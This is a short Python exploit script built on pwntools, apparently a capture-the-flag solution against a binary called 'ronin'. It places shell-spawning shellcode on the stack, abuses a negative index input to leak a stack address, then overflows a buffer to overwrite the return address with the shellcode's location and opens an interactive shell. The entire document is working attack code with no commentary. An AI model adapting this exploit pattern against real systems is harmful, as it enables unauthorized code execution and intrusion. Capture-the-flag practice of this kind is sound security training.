#!/usr/bin/env python3

from pwn import *

exe = ELF("./ronin")
context.binary = exe
context.terminal = ["tmux", "splitw", "-h"]

def conn():
    if args.LOCAL:
        if args.GDB:
            r = gdb.debug([exe.path],
"""
b main
c
""")
        else:
            r = process([exe.path])

    else:
        r = remote("localhost", 1024)

    return r

def main():
    r = conn()
    sc = asm(shellcraft.sh())
    print(f"sz: {len(sc)}")
    payload = b"Chase after it." + sc
    r.sendline(payload)

    r.sendline(b"-4")
    r.recvuntil(b"Which way will you look? ")
    leak = r.recvn(6)
    stack_addr = int.from_bytes(leak, "little")
    print(f"got stack leak {hex(stack_addr)}")

    sc_addr = stack_addr - 65

    r.sendline(b"2")
    payload = b'A' * 32 + b'B' * 8 + p64(sc_addr)
    r.sendline(payload)

    r.interactive()


if __name__ == "__main__":
    main()
